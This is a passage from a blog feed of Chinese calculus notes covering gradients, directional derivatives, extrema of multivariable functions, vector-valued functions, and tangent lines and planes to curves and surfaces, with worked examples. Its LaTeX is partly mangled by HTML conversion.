l}\right|_{(1,1,2)}=3\cdot\frac{1}{2}+3\cdot\frac{\sqrt{2}}{2}+2\cdot\frac{1}{2}=\frac{1}{2}(5+3\sqrt{2})\end{align}$</p><h2 id="梯度"><a href="#梯度" class="headerlink" title="梯度"></a>梯度</h2><p>在二元函数的情形，设函数$f(x,y)$在平面区域$D$内具有一阶连续偏导数，则对于每一点$P<em>{0}\left(x</em>{0},y_{0}\right)\in D$，都可定出一个向量</p><p>$\begin{align}f<em>{x}\left(x</em>{0},y<em>{0}\right)\vec{\boldsymbol i} +f</em>{y}\left(x<em>{0},y</em>{0}\right)\vec{\boldsymbol{j}}\end{align}$</p><p>这向量称为函数$f(x,y)$在点$P<em>{0}\left(x</em>{0},y<em>{0}\right)$的<strong>梯度</strong>，记作$\operatorname{grad}f\left(x</em>{0},y<em>{0}\right)$或$\nabla f\left(x</em>{0},y_{0}\right)$</p><p>$\begin{align}\operatorname{grad}f\left(x<em>{0},y</em>{0}\right)=\nabla f\left(x<em>{0},y</em>{0}\right)=f<em>{x}\left(x</em>{0},y<em>{0}\right)\vec{\boldsymbol{i}}+f</em>{y}\left(x<em>{0},y</em>{0}\right)\vec{\boldsymbol{j}}\end{align}$</p><p>如果函数$f(x,y)$在点$P<em>{0}\left(x</em>{0},y<em>{0}\right)$可微分，$\vec{\boldsymbol{e}}</em>{l}=(\cos\alpha,\cos\beta)$是与方向l同向的单位向量，那么</p><p>$\begin{align}<br>\left.\frac{\partial f}{\partial l}\right|<em>{\left(x</em>{0},y<em>{0}\right)}&amp;=f</em>{x}\left(x<em>{0},y</em>{0}\right)\cos\alpha+f<em>{y}\left(x</em>{0},y<em>{0}\right)\cos\beta\<br>&amp;=\operatorname{grad}f\left(x</em>{0},y<em>{0}\right)\cdot\vec{\boldsymbol{e}}</em>{l}=\left|\operatorname{grad}f\left(x<em>{0},y</em>{0}\right)\right|\cos\theta<br>\end{align}$</p><p>其中$\theta=\left(\operatorname{grad}f\left(x<em>{0},y</em>{0}\right),\vec{\boldsymbol{e}}_{l}\right)$的夹角</p><p>（1）当$\theta=0$，即方向$\vec{\boldsymbol{e}}<em>{t}$与梯度$\operatorname{grad}f\left(x</em>{0},y<em>{0}\right)$的方向相同时，函数$f(x,y)$增加最快。此时，函数在这个方向的方向导数达到最大值，这个最大值就是梯度$\operatorname{grad}f\left(x</em>{0},y_{0}\right)$的模，即</p><p>$\begin{align}\left.\frac{\partial f}{\partial l}\right|<em>{\left(x</em>{0},y<em>{0}\right)}=\left|\operatorname{grad}f\left(x</em>{0},y_{0}\right)\right|\end{align}$</p><p>这个结果也表示:函数$f(x,y)$在一点的梯度$\operatorname{grad}f$是这样一个向量，它的方向是函数在这点的方向导数取得最大值的方向，它的模就等于方向导数的最大值</p><p>（2）当$\theta=\pi$，即方向$\vec{\boldsymbol{e}}<em>{t}$与梯度$\operatorname{grad}f\left(x</em>{0},y_{0}\right)$的方向相反时，函数$f(x,y)$减少最快，函数在这个方向的方向导数达到最小值，即</p><p>$\begin{align}\left.\frac{\partial f}{\partial l}\right|<em>{\left(x</em>{0},y<em>{0}\right)}=-\left|\operatorname{grad}f\left(x</em>{0},y_{0}\right)\right|\end{align}$</p><p>（3）当$\theta=\frac{\pi}{2}$，即方向$\vec{\boldsymbol{e}}<em>{t}$与梯度$\operatorname{grad}f\left(x</em>{0},y_{0}\right)$的方向正交时，函数的变化率为零，即</p><p>$\begin{align}\left.\frac{\partial f}{\partial l}\right|<em>{\left(x</em>{0},y<em>{0}\right)}=\left|\operatorname{grad}f\left(x</em>{0},y_{0}\right)\right|\cos\theta=0\end{align}$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/99.png" alt="3"></p><h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h4><p>求$\operatorname{grad}\frac{1}{x^{2}+y^{2}}$</p><p>解这里$f(x,y)=\frac{1}{x^{2}+y^{2}}$因为</p><p>$\begin{align}\frac{\partial f}{\partial x}=-\frac{2x}{\left(x^{2}+y^{2}\right)^{2}},\frac{\partial f}{\partial y}=-\frac{2y}{\left(x^{2}+y^{2}\right)^{2}}\end{align}$</p><p>所以</p><p>$\begin{align}\operatorname{grad}\frac{1}{x^{2}+y^{2}}=-\frac{2x}{\left(x^{2}+y^{2}\right)^{2}}\vec{\boldsymbol{i}}-\frac{2y}{\left(x^{2}+y^{2}\right)^{2}}\vec{\boldsymbol{j}}\end{align}$</p><hr><p>设$f(x,y)=\frac{1}{2}\left(x^{2}+y^{2}\right),P<em>{0}(1,1)$，求<br>（1）$f(x,y)$在$P</em>{0}$处增加最快的方向以及$f(x,y)$沿这个方向的方向导数<br>（2）$f(x,y)$在$P<em>{0}$处减少最快的方向以及$f(x,y)$沿这个方向的方向导数<br>（3）$f(x,y)$在$P</em>{0}$处的变化率为零的方向</p><p>（1）$f(x,y)$在$P_{0}$处沿$\nabla f(1,1)$的方向增加最快</p><p>$\begin{align}\nabla f(1,1)=\left.(x \vec{\boldsymbol{i}}+y\vec{\boldsymbol{j}})\right|_{(1,1)}=\vec{\boldsymbol{i}}+\vec{\boldsymbol{j}}\end{align}$</p><p>故所求方向可取为</p><p>$\begin{align}\boldsymbol{n}=\frac{\nabla f(1,1)}{|\nabla f(1,1)|}=\frac{1}{\sqrt{2}}\vec{\boldsymbol{i}}+\frac{1}{\sqrt{2}}\vec{\boldsymbol{j}}\end{align}$</p><p>方向导数为</p><p>$\begin{align}\left.\frac{\partial f}{\partial n}\right|_{(1,1)}=|\nabla f(1,1)|=\sqrt{2}\end{align}$</p><p>（2）$f(x,y)$在$P_{0}$处沿$-\nabla f(1,1)$的方向减少最快，这方向可取为</p><p>$\begin{align}n_{1}=-n=-\frac{1}{\sqrt{2}}\vec{\boldsymbol{i}}-\frac{1}{\sqrt{2}}\vec{\boldsymbol{j}}\end{align}$</p><p>方向导数为</p><p>$\begin{align}\left.\frac{\partial f}{\partial n<em>{1}}\right|</em>{(1,1)}=-|\nabla f(1,1)|=-\sqrt{2}\end{align}$</p><p>（3）$f(x,y)$在$P_{0}$处沿垂直于$\nabla f(1,1)$的方向变化率为零，这方向是</p><p>$\begin{align}&amp;\boldsymbol{n}<em>{2}=-\frac{1}{\sqrt{2}}\vec{\boldsymbol{i}}+\frac{1}{\sqrt{2}}\vec{\boldsymbol{j}}\&amp;\boldsymbol{n}</em>{3}=\frac{1}{\sqrt{2}}\vec{\boldsymbol{i}}-\frac{1}{\sqrt{2}}\vec{\boldsymbol{j}}\end{align}$</p><hr><p>设$f(x,y,z)=x^{3}-xy^{2}-z,P<em>{0}(1,1,0)$，问$f(x,y,z)$在$P</em>{0}$处沿什么方向变化最快，在这个方向的变化率是多少？</p><p>$\nabla f=f<em>{x}\vec{\boldsymbol{i}}+f</em>{y}\vec{\boldsymbol{j}}+f<em>{z}\boldsymbol{k}=\left(3x^{2}-y^{2}\right)\vec{\boldsymbol{i}}-2xy\vec{\boldsymbol{j}}-\boldsymbol{k},\nabla f(1,1,0)=2\vec{\boldsymbol{i}}-2\vec{\boldsymbol{j}}-\boldsymbol{k}$<br>$f(x,y,z)$在$P</em>{0}$处沿$\nabla f(1,1,0)$的方向增加最快，沿$-\nabla f(1,1,0)$的方向减少最快，在这两个方向的变化率分别是</p><p>$\begin{align}<br>|\nabla f(1,1,0)|=\sqrt{2^{2}+(-2)^{2}+1}=3\<br>-|\nabla f(1,1,0)|=-3<br>\end{align}$</p><h2 id="多元函数的极致与最值"><a href="#多元函数的极致与最值" class="headerlink" title="多元函数的极致与最值"></a>多元函数的极致与最值</h2><h3 id="无约束极值"><a href="#无约束极值" class="headerlink" title="无约束极值"></a>无约束极值</h3><p><mark class="hl-label green">定义</mark>     设函数$z=f(x,y)$在点$P\left(x<em>{0},y</em>{0}\right)$的某邻域内有定义，若对该邻域内任意的点$P(x,y)$均有</p><p>$\begin{align}f(x,y)\leqslant f\left(x<em>{0},y</em>{0}\right)\quad or\quad f(x,y)\geqslant f\left(x<em>{0},y</em>{0}\right)\end{align}$</p><p>则称$\left(x<em>{0},y</em>{0}\right)$为$f(x,y)$的极大值点(或极小值点)；称$f\left(x<em>{0},y</em>{0}\right)$为$f(x,y)$的极大值(或极小值)。极大值点和极小值点统称为<strong>极值点</strong>，极大值和极小值统称为<strong>极值</strong>。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/100.png" alt="2"></p><p>二阶导数的正负可以决定函数凹凸性，$f’’(x) &gt; 0$说明函数$f(x)$是凹的（绿色的图），$f’’(x) &lt; 0$说明函数$f(x)$是凸的（红色的）。如下图所示。</p><center class="half"> <img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/101.png" alt="2" style="zoom:25%;" />  <img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/102.png" alt="2" style="zoom:25%;" /> </center><p><mark class="hl-label green">定义</mark> <mark class="hl-label red">极值的必要条件</mark>      设$z=f(x,y)$在点$(x<em>{0},y</em>{0})$存在偏导数，且$(x<em>{0},y</em>{0})$为$f(x,y)$的极值点，则</p><p>$\begin{align}f<em>{x}^{\prime}\left(x</em>{0},y<em>{0}\right)=0,f</em>{y}^{\prime}\left(x<em>{0},y</em>{0}\right)=0\end{align}$</p><p><mark class="hl-label green">定义</mark> <mark class="hl-label red">极值的充分条件</mark>      设$z=f(x,y)$在点$P<em>{0}\left(x</em>{0},y<em>{0}\right)$的某邻域内有二阶连续偏导数，又$f</em>{x}^{\prime}(x<em>{0},y</em>{0})=0,f<em>{y}^{\prime}(x</em>{0},y_{0})=0$。记</p><p>$\begin{align}A=f<em>{xx}^{\prime\prime}\left(x</em>{0},y<em>{0}\right),\quad B=f</em>{xy}^{\prime\prime}\left(x<em>{0},y</em>{0}\right),\quad C=f<em>{yy}^{\prime\prime}\left(x</em>{0},y_{0}\right)\end{align}$</p><p>则有下述结论:</p><ol><li>若$AC-B^{2}&gt;0$，则$\left(x<em>{0},y</em>{0}\right)$为$f(x,y)$的极值点。<ol><li>$A&lt;0$，则$\left(x<em>{0},y</em>{0}\right)$为$f(x,y)$的极大值点。</li><li>$A&gt;0$，则$\left(x<em>{0},y</em>{0}\right)$为$f(x,y)$的极小值点。</li></ol></li><li>若$AC-B^{2}&lt;0$，则$\left(x<em>{0},y</em>{0}\right)$不为$f(x,y)$的极值点。</li><li>若$AC-B^{2}=0$，则$\left(x<em>{0},y</em>{0}\right)$可能为$f(x,y)$的极值点，也可能不为$f(x,y)$的极值点(此时，一般用定义判定)。</li></ol><p>求具有二阶连续偏导数二元函数$z=f(x,y)$极值的一般步骤为：</p><ol><li>求出$f(x,y)$的驻点$P<em>{1},\cdots,P</em>{k}$；</li><li>利用极值的充分条件判定驻点$P_{i}$是否为极值点。</li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>多元函数微分的几何应用</title>
    <link href="https://www.ascotbe.com/2023/07/03/FurtherMathematics_0xF/"/>
    <id>https://www.ascotbe.com/2023/07/03/FurtherMathematics_0xF/</id>
    <published>2023-07-03T15:58:53.000Z</published>
    <updated>2023-07-23T15:42:41.908Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_F.png" alt="40401062974b995af8bd4cce59fed289" style="zoom:50%;" /></p><h2 id="一元向量值函数及其导数"><a href="#一元向量值函数及其导数" class="headerlink" title="一元向量值函数及其导数"></a>一元向量值函数及其导数</h2><h3 id="一元向量值函数"><a href="#一元向量值函数" class="headerlink" title="一元向量值函数"></a>一元向量值函数</h3><p>由空间解析几何知道，空间曲线$\Gamma$的参数方程为</p><p>$\begin{align}\left{\begin{array}{l}x=\varphi(t), \y=\psi(t), \quad t \in[\alpha, \beta]  \z=\omega(t),\end{array}\right.\end{align}$</p><p>方程也可以写成向量形式。若记</p><p>$\begin{align}\vec{r}=x \vec{i}+y \vec{j}+z \vec{k}, \quad \vec{f}(t)=\varphi(t) \vec {i}+\psi(t) \vec{j}+\omega(t) \vec{k}\end{align}$</p><p>则方程就成为向量方程</p><p>$\begin{align}\vec{r}=\vec{f}(t), t \in[\alpha, \boldsymbol{\beta}] \end{align}$</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>设数集$D\subset\mathbf{R}$，则称映射$f:D\rightarrow\mathbf{R}^{n}$为一元向量值函数，通常记为</p><p>$\begin{align}\vec{r}=\vec{f}(t),t\in D\end{align}$</p><p>其中数集$D$称为函数的定义域，$t$称为自变量，$\vec{r}$称为因变量</p><h3 id="向量值函数与数量函数的关系"><a href="#向量值函数与数量函数的关系" class="headerlink" title="向量值函数与数量函数的关系"></a>向量值函数与数量函数的关系</h3><p>数量函数</p><ul><li>一元函数：$y=f(x) \quad x \in D$</li><li>多元函数：$y=f(x, y)\quad(x, y) \in D$</li></ul><p>向量值函数</p><ul><li>一元向量值函数：$\vec{r}=\vec{j}(t) \quad t \in D$ </li><li>多元向量值函数：$\vec{r}=\vec{f}\left(x<em>{1}, x</em>{1}, \cdots, x_{n}\right)$ </li></ul><h3 id="一元向量值函数的极限"><a href="#一元向量值函数的极限" class="headerlink" title="一元向量值函数的极限"></a>一元向量值函数的极限</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>设向量值函数$\vec{f}(t)$在点$t<em>{0}$的某一去心邻域内有定义，如果存在一个常向量$\vec{r}</em>{0}$，对于任意给定的正数$\varepsilon$，总存在正数$\delta$，使得当$t$满足$0&lt;\left|t-t_{0}\right|&lt;\delta$时，对应的函数值$\vec{f}(t)$都满足不等式</p><p>$\begin{align}|\vec{f}(t)-\vec{r}_{0}|&lt;\varepsilon\end{align}$</p><p>那么，常向量$\vec{r}<em>{0}$就叫做向量值函数$\vec{f}(t)$当$t \rightarrow t</em>{0}$时的极限，记作</p><p>$\begin{align}\lim_{t \to t_0} \vec{f}(t)=\vec{r}_0\end{align}$</p><h3 id="一元向量值函数的导数"><a href="#一元向量值函数的导数" class="headerlink" title="一元向量值函数的导数"></a>一元向量值函数的导数</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><p>设向量值函数$\vec{r}=\vec{f}(t)$在点$t_{0}$的某一邻域内有定义，如果</p><p>$\begin{align}\lim <em>{\Delta t \rightarrow 0} \frac{\Delta \vec{r}}{\Delta t}=\lim </em>{\Delta t \rightarrow 0} \frac{\vec{f}\left(t<em>{0}+\Delta t\right)-\vec{f}\left(t</em>{0}\right)}{\Delta t}\end{align}$</p><p>存在，那么就称这个极限向量为向量值函数$\vec{r}=\vec{f}(t)$在$t<em>{0}$处的导数或导向量，记作$\vec{f}^{\prime}(t</em>{0})$或$\left.\frac{\mathrm{d}\vec{r}}{\mathrm{d}t}\right|<em>{t=t</em>{0}}$</p><h4 id="运算法则"><a href="#运算法则" class="headerlink" title="运算法则"></a>运算法则</h4><p>设$\vec{u}(t)$、$\vec{v}(t)$是可导的向量值函数，$\overrightarrow{C}$是常向量,$c$是任一常数，$\varphi(t)$是可导的数量函数，则</p><ul><li>$\frac{\mathrm{d}}{\mathrm{d} t} \overrightarrow{C}=\vec{0}$</li><li>$\frac{\mathrm{d}}{\mathrm{d} t}[c\vec{ u}(t)]=c \vec{u}^{\prime}(t)$</li><li>$\frac{\mathrm{d}}{\mathrm{d} t}[\vec{u}(t) \pm \vec{v}(t)]=\vec{u}^{\prime}(t) \pm \vec{v}^{\prime}(t)$</li><li>$\frac{\mathrm{d}}{\mathrm{d} t}[\varphi(t) \vec{u}(t)]=\varphi^{\prime}(t) \vec{u}(t)+\varphi(t) \vec{u}^{\prime}(t)$</li><li>$\frac{\mathrm{d}}{\mathrm{d} t}[\vec{u}(t) \cdot \vec{v}(t)]=\vec{u}^{\prime}(t) \cdot \vec{v}(t)+\vec{u}(t) \cdot \vec{v}^{\prime}(t)$</li><li>$\frac{\mathrm{d}}{\mathrm{d} t}[\vec{u}(t) \times \vec{v}(t)]=\vec{u}^{\prime}(t) \times \vec{v}(t)+\vec{u}(t) \times \vec{v}^{\prime}(t)$</li><li>$\frac{\mathrm{d}}{\mathrm{d} t} \vec{u}[\varphi(t)]=\varphi^{\prime}(t) \vec{u}^{\prime}[\varphi(t)]$</li></ul><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>设$\vec{f}(t)=(\cos t)\vec{i}+(\sin t)\vec{j}+t\vec{k}$，求$\lim_{t\rightarrow\frac{\pi}{4}}\vec{f}(t)$及$\vec{f}’(t)$</p><p>解</p><p>$\begin{align}<br>\lim <em>{t \rightarrow \frac{\pi}{4}} \vec{f}(t) &amp; =\left(\lim </em>{t \rightarrow \frac{\pi}{4}} \cos t\right) \vec{i}+\left(\lim <em>{t \rightarrow \frac{\pi}{4}} \sin t\right) \vec{j}+\left(\lim </em>{t \rightarrow \frac{\pi}{4}} t\right) \vec{k} \<br>&amp; =\frac{\sqrt{2}}{2} \vec{i}+\frac{\sqrt{2}}{2} \vec{j}+\frac{\pi}{4} \vec{k}<br>\\vec{f}’(t)&amp;=(\cos t)’ \vec{i}+(\sin t)’\vec{j}+(t)’\vec{k}\&amp;=(-\sin t)\vec{i}+(\cot)\vec{j}+\vec{k}\end{align}$</p><hr><p>设空间曲线$\Gamma$的向量方程为：$\vec{r}=\vec{f}(t)=\left(t^{2}+1,4 t-3,2 t^{2}-6 t\right), t \in R$，求曲线$\Gamma$在与$t=2$相应的点处的单位切向量。</p><p>$\begin{align}&amp;\vec{f}^{\prime}(t)=(2 t, 4,4 t-6) , t \in R\&amp;\vec{f}^{\prime}(2)=(4,4,2)=2(2,2,1) \ &amp;\overrightarrow{T}=(2,2,1),|\overrightarrow{T}|=\sqrt{2^{2}+2^{2}+1}=3\end{align}$</p><p>由导向量的几何意义知，曲线$\Gamma$在与$t=2$相应的点处的一个单位切向量是$\left(\frac{2}{3},\frac{2}{3},\frac{1}{3}\right)$，其指向与t的增长方向一致；另一个单位切向量是$\left(-\frac{2}{3},-\frac{2}{3}\right.,\left.-\frac{1}{3}\right)$，其指向与t的增长方向相反</p><h2 id="空间曲线的切线与法平面"><a href="#空间曲线的切线与法平面" class="headerlink" title="空间曲线的切线与法平面"></a>空间曲线的切线与法平面</h2><h3 id="第一种形式"><a href="#第一种形式" class="headerlink" title="第一种形式"></a>第一种形式</h3><p>求曲线$\Gamma$与点$M(x_0,y_0,z_0)$处的切线与法平面，记$\vec f(t)=(\varphi(t),\psi(t),\omega(t)),t\in[\alpha,\beta]$。点$M(x_0,y_0,z_0)$对应参数$t_0$</p><p>切向量</p><p>$\begin{align}\overrightarrow{T}=\vec {f}^{\prime}\left(t<em>{0}\right)=\left(\varphi^{\prime}\left(t</em>{0}\right),\psi^{\prime}\left(t<em>{0}\right),\omega^{\prime}\left(t</em>{0}\right)\right)\end{align}$</p><p>切线方程</p><p>$\begin{align}\frac{x-x<em>{0}}{\varphi^{\prime}\left(t</em>{0}\right)}=\frac{y-y<em>{0}}{\psi^{\prime}\left(t</em>{0}\right)}=\frac{z-z<em>{0}}{\omega^{\prime}\left(t</em>{0}\right)}\end{align}$</p><p>法平面方程</p><p>$\begin{align}\varphi^{\prime}\left(t<em>{0}\right)\left(x-x</em>{0}\right)+\psi^{\prime}\left(t<em>{0}\right)\left(y-y</em>{0}\right)+\omega^{\prime}\left(t<em>{0}\right)\left(z-z</em>{0}\right)=0\end{align}$</p><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p>求曲线$x=t,y=t^{2},z=t^{3}$在点$(1,1,1)$处的切线及法平面方程</p><p>因为$x<em>{t}^{\prime}=1,y</em>{t}^{\prime}=2t,z<em>{t}^{\prime}=3t^{2}$，而点$(1,1,1)$所对应的参数$t</em>{0}=1$。所以切向量</p><p>$\begin{align}\overrightarrow{T}=(1,2,3)\end{align}$</p><p>切线方程为</p><p>$\begin{align}\frac{x-1}{1}=\frac{y-1}{2}=\frac{z-1}{3}\end{align}$</p><p>法平面方程为</p><p>$\begin{align}(x-1)+2(y-1)+3(z-1)=0\end{align}$</p><p>化简后得</p><p>$\begin{align}x+2y+3z=6\end{align}$</p><h3 id="第二种形式"><a href="#第二种形式" class="headerlink" title="第二种形式"></a>第二种形式</h3><p>如果空间曲线$\Gamma$的方程以下列的形式给出</p><p>$\begin{align}\left{\begin{array}{l}y=\varphi(x)\z=\psi(x)\end{array}\right.\end{align}$</p><p>设$M(x_0,y_0,z_0)$为曲线方程上$\Gamma$的一点求过$M$点的切线及其法平面方程，取$x$为参数，它就可以表示为参数方程的形式</p><p>$\begin{align}\left{\begin{array}{l}x=x\y=\varphi(x)\z=\psi(x)\end{array}\right.\end{align}$</p><p>点$M$对应参数$x=x<em>{0}$。则根据上面的讨论可知，$\overrightarrow{T}=\left(1,\varphi^{\prime}\left(x</em>{0}\right)\right.,\left.\psi^{\prime}\left(x<em>{0}\right)\right)$，因此曲线$\Gamma$在点$M\left(x</em>{0},y<em>{0},z</em>{0}\right)$处的切线方程为</p><p>$\begin{align}\frac{x-x<em>{0}}{1}=\frac{y-y</em>{0}}{\varphi^{\prime}\left(x<em>{0}\right)}=\frac{z-z</em>{0}}{\psi^{\prime}\left(x_{0}\right)}\end{align}$</p><p>在点$M\left(x<em>{0},y</em>{0},z_{0}\right)$处的法平面方程为</p><p>$\begin{align}\left(x-x<em>{0}\right)+\varphi^{\prime}\left(x</em>{0}\right)\left(y-y<em>{0}\right)+\psi^{\prime}\left(x</em>{0}\right)\left(z-z_{0}\right)=0\end{align}$</p><h3 id="第三种形式"><a href="#第三种形式" class="headerlink" title="第三种形式"></a>第三种形式</h3><p>设空间曲线$\Gamma$的方程以下列的形式给出</p><p>$\begin{align}\left{\begin{array}{l}F(x,y,z)=0\G(x,y,z)=0\end{array}\right.\end{align}$</p><p>$M\left(x<em>{0},y</em>{0},z<em>{0}\right)$是曲线$\Gamma$上的一个点，求过$M$的切线和法平面方程。设$F$和$G$有对各个变量的连续偏导数，且在点$M\left(x</em>{0},y<em>{0},z</em>{0}\right)$的某一邻域内确定了一组函数$y=\varphi(x),z=\psi(x)$则</p><p>$\begin{align}\begin{array}{l}F[x,\varphi(x),\psi(x)]\equiv0\G[x,\varphi(x),\psi(x)]\equiv0\end{array}\end{align}$</p><p>两边分别对$x$求全导数</p><p>$\begin{align}\left{\begin{array}{l}<br>\frac{\partial F}{\partial x}+\frac{\partial F}{\partial y} \frac{\mathrm{d} y}{\mathrm{~d} x}+\frac{\partial F}{\partial z} \frac{\mathrm{d} z}{\mathrm{~d} x}=0 \<br>\frac{\partial G}{\partial x}+\frac{\partial G}{\partial y} \frac{\mathrm{d} y}{\mathrm{~d} x}+\frac{\partial G}{\partial z} \frac{\mathrm{d} z}{\mathrm{~d} x}=0<br>\end{array}\right.\end{align}$</p><p>由假设可知，在点$M$的某个邻域内</p><p>$\begin{align}J=\frac{\partial(F, G)}{\partial(y, z)} \neq 0\end{align}$</p><p>故可解得</p><p>$\begin{align}\frac{\mathrm{d} y}{\mathrm{~d} x}=\varphi^{\prime}(x)=\frac{\left|\begin{array}{ll}F<em>{z} &amp; F</em>{x} \G<em>{z} &amp; G</em>{x}\end{array}\right|}{\left|\begin{array}{ll}F<em>{y} &amp; F</em>{z} \G<em>{y} &amp; G</em>{z}\end{array}\right|}, \frac{\mathrm{d} z}{\mathrm{~d} x}=\psi^{\prime}(x)=\frac{\left|\begin{array}{ll}F<em>{x} &amp; F</em>{y} \G<em>{x} &amp; G</em>{y}\end{array}\right|}{\left|\begin{array}{ll}F<em>{y} &amp; F</em>{z} \G<em>{y} &amp; G</em>{z}\end{array}\right|}\end{align}$</p><p>切向量</p><p>$\begin{align}\overrightarrow{T}=\left(1,\varphi^{\prime}\left(x<em>{0}\right),\psi^{\prime}\left(x</em>{0}\right)\right)\end{align}$</p><p>分子分母中带下标$M$的行列式表示行列式在点$M\left(x<em>{0},y</em>{0},z<em>{0}\right)$的值。把上面的切向量$\overrightarrow{T}$乘$\left|\begin{array}{ll}F</em>{y}&amp;F<em>{z}\G</em>{y}&amp;G<em>{z}\end{array}\right|</em>{M}$，得</p><p>$\begin{align}\overrightarrow{T}<em>{1}=\left(\left|\begin{array}{ll}<br>F</em>{y} &amp; F<em>{z} \<br>G</em>{y} &amp; G<em>{z}<br>\end{array}\right|</em>{M},\left|\begin{array}{ll}<br>F<em>{z} &amp; F</em>{x} \<br>G<em>{z} &amp; G</em>{x}<br>\end{array}\right|<em>{M},\left|\begin{array}{ll}<br>F</em>{x} &amp; F<em>{y} \<br>G</em>{x} &amp; G<em>{y}<br>\end{array}\right|</em>{M}\right)\end{align}$</p><p>这也是曲线$\Gamma$在点$M$处的一个切向量。</p><p>由此可写出曲线$\Gamma$在点$M\left(x<em>{0},y</em>{0},z_{0}\right)$处的切线方程为</p><p>$\begin{align}\frac{x-x<em>{0}}{\left|\begin{array}{cc}<br>F</em>{y} &amp; F<em>{z} \<br>G</em>{y} &amp; G<em>{z}<br>\end{array}\right|</em>{M}}=\frac{y-y<em>{0}}{\left|\begin{array}{cc}<br>F</em>{z} &amp; F<em>{x} \<br>G</em>{z} &amp; G<em>{x}<br>\end{array}\right|</em>{M}}=\frac{z-z<em>{0}}{\left|\begin{array}{cc}<br>F</em>{x} &amp; F<em>{y} \<br>G</em>{x} &amp; G<em>{y}<br>\end{array}\right|</em>{M}}\end{align}$</p><p>曲线$\Gamma$在点$M\left(x<em>{0},y</em>{0},z_{0}\right)$处的法平面方程为</p><p>$\begin{align}\left|\begin{array}{ll}<br>F<em>{y} &amp; F</em>{z} \<br>G<em>{y} &amp; G</em>{z}<br>\end{array}\right|<em>{M}\left(x-x</em>{0}\right)+\left|\begin{array}{ll}<br>F<em>{z} &amp; F</em>{x} \<br>G<em>{z} &amp; G</em>{x}<br>\end{array}\right|<em>{M}\left(y-y</em>{0}\right)+\left|\begin{array}{ll}<br>F<em>{x} &amp; F</em>{y} \<br>G<em>{x} &amp; G</em>{y}<br>\end{array}\right|<em>{M}\left(z-z</em>{0}\right)=0\end{align}$</p><h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h4><p>求曲线$x^{2}+y^{2}+z^{2}=6,x+y+z=0$在点$(1,-2,1)$处的切线及法平面方程</p><p>将所给方程的两边对$x$求导</p><p>$\begin{align}\left{\begin{array}{l}<br>2 x+2 y \cdot \frac{d y}{d x}+2 z \cdot \frac{d z}{d x}=0 \<br>1+\frac{d y}{d x}+\frac{d z}{d x}=0<br>\end{array}\right.\end{align}$</p><p>移项化简后为</p><p>$\begin{align}\left{\begin{array}{l}<br>y \frac{\mathrm{d} y}{\mathrm{~d} x}+z \frac{\mathrm{d} z}{\mathrm{~d} x}=-x \<br>\frac{\mathrm{d} y}{\mathrm{~d} x}+\frac{\mathrm{d} z}{\mathrm{~d} x}=-1<br>\end{array}\right.\end{align}$</p><p>由此得</p><p>$\begin{align}<br>\frac{\mathrm{d} y}{\mathrm{~d} x}=\frac{\left|\begin{array}{cc}<br>-x &amp; z \<br>-1 &amp; 1<br>\end{array}\right|}{\left|\begin{array}{ll}<br>y &amp; z \<br>1 &amp; 1<br>\end{array}\right|}=\frac{z-x}{y-z}, \frac{\mathrm{d} z}{\mathrm{~d} x}=\frac{\left|\begin{array}{cc}<br>y &amp; -x \<br>1 &amp; -1<br>\end{array}\right|}{\left|\begin{array}{ll}<br>y &amp; z \<br>1 &amp; 1<br>\end{array}\right|}=\frac{x-y}{y-z}  \<br>\left.\frac{\mathrm{d} y}{\mathrm{~d} x}\right|<em>{(1,-2,1)}=0,\left.\frac{\mathrm{d} z}{\mathrm{~d} x}\right|</em>{(1,-2,1)}=-1  \<br>\end{align}$</p><p>从而切向量为</p><p>$\begin{align}\overrightarrow{T}=(1,0,-1)\end{align}$</p><p>切线方程为</p><p>$\begin{align}\frac{x-1}{1}=\frac{y+2}{0}=\frac{z-1}{-1}\end{align}$</p><p>法平面方程为</p><p>$\begin{align}(x-1)+0 \cdot(y+2)-(z-1)=0\end{align}$</p><p>化简后得</p><p>$\begin{align}x-z=0\end{align}$</p><h2 id="曲面的切平面与法线"><a href="#曲面的切平面与法线" class="headerlink" title="曲面的切平面与法线"></a>曲面的切平面与法线</h2><p>曲面为$F(x,y,z)=0$的情形</p><p>设$M(\left.x<em>{0},y</em>{0},b_{0}\right)$为曲面$\Sigma$上任意一点，在曲面$\Sigma$上，通过点$M$任取一条曲线</p><p>$\begin{align}\Gamma:\left{\begin{array}{l}x=\varphi(t)\y=\psi(t)\z=w(t)\end{array}\quad\alpha\leqslant t\leqslant\beta\right.\end{align}$</p><p>$M\left(x<em>{0},y</em>{0},z<em>{0}\right)$对应参数为$t=t</em>{0}$</p><p>则过$M$的切线方程为</p><p>$\begin{align}\frac{x-x<em>{0}}{\varphi^{\prime}\left(t</em>{0}\right)}=\frac{y-y<em>{0}}{\psi^{\prime}\left(t</em>{0}\right)}=\frac{z-z<em>{0}}{\omega^{\prime}\left(t</em>{0}\right)}\end{align}$</p><p>切平面方程</p><p>$\begin{align}F<em>{x}\left(x</em>{0}, y<em>{0}, z</em>{0}\right)\left(x-x<em>{0}\right)+F</em>{y}\left(x<em>{0}, y</em>{0}, z<em>{0}\right)\left(y-y</em>{0}\right)+<br>F<em>{z}\left(x</em>{0}, y<em>{0}, 